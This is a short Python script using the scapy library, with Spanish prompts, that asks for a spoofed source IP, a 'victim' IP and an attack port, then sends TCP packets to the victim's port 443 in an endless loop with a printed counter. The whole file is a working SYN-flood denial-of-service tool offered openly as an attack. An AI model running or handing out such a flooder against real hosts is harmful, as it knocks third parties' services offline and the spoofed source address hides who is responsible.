#!/usr/local/bin/python3
# -*- coding: utf-8 -*-

import scapy
from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send


src = input("Ingresa la ip de donde proviene el ataque:\n")
victima = input ("Ingrese el ip de la victima:\n")
puerto_ataque = int(input("Ingresa el puerto por al cual se hará el ataque:\n"))

numero_paquete = 1

while True:
    IP1 = IP(src=src, dst=victima)
    TCP1 = TCP(sport=puerto_ataque,dport=443)
    pkt = IP1/TCP1
    send(pkt, inter=.001)
    print("Paquete enviado numero:{}".format(numero_paquete))
    numero_paquete = numero_paquete +1